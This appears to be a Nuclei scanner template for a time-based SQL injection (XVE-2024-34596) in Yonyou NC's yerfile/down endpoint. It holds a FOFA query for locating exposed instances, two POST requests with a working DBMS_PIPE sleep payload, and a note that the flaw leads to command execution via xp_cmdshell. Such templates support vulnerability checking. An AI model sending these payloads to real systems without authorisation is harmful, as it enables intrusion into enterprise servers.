id: yongyouNC-yerfile_down-sql-XVE-2024-34596

info:
  name: 用友NC yerfile/down SQL注入漏洞(XVE-2024-34596)
  author: Superhero
  severity: high
  description: |-
    fofa: app="用友-UFIDA-NC"
    用友NC portal/pt/yerfile/down 接口存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。
  reference:
    - https://mp.weixin.qq.com/s/JkhaRMFyZw4y6oj1W4WGfQ?token=17877307&lang=zh_CN
  tags: sql injection

http:
  - raw:
      - |
        POST /portal/pt/yerfile/down/bill?pageId=login HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Content-Type: application/x-www-form-urlencoded

        id=1'+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),4)--

      - |
        POST /portal/pt/yerfile/down/bill?pageId=login HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Content-Type: application/x-www-form-urlencoded

        id=1'+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),8)--

    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and